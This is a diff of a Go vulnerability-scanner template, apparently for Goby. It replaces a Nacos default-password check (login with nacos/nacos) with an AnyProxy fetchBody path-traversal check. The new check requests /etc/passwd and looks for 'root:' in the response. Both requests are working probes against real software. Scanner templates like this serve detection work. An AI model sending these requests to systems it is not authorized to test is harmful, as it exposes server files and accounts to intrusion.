@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
-  "Description": "",
-  "Product": "Nacos",
+  "Name": "Alibaba AnyProxy fetchBody 任意文件读取漏洞",
+  "Description": "<p><span style=\"font-size: 16px;\">Alibaba AnyProxy 低版本存在任意文件读取，通过漏洞，攻击者可以获取服务器敏感信息（<span style=\"font-size: 16px;\">Alibaba AnyProxy &lt; 4.0.10</span>）</span><br></p>",
+  "Product": "AnyProxy",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
-  "Level": "3",
+  "FofaQuery": "\"anyproxy\"",
+  "GobyQuery": "\"anyproxy\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,17 +29,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "method": "GET",
+        "uri": "/fetchBody?id=1/../../../../../../../../etc/passwd",
         "follow_redirect": true,
-        "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
+        "header": {},
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -56,7 +51,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "root:",
             "bz": ""
           }
         ]
@@ -112,16 +107,16 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
-      "Description": "",
+      "Name": "Alibaba AnyProxy fetchBody 任意文件读取漏洞",
+      "Product": "AnyProxy",
+      "Description": "<p><span style=\"font-size: 16px;\">Alibaba AnyProxy 低版本存在任意文件读取，通过漏洞，攻击者可以获取服务器敏感信息（<span style=\"font-size: 16px;\">Alibaba AnyProxy &lt; 4.0.10</span>）</span><br></p>",
       "Recommendation": "",
       "Impact": "",
       "VulType": [],
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "Alibaba AnyProxy fetchBody file read",
       "Product": "",
       "Description": "",
       "Recommendation": "",
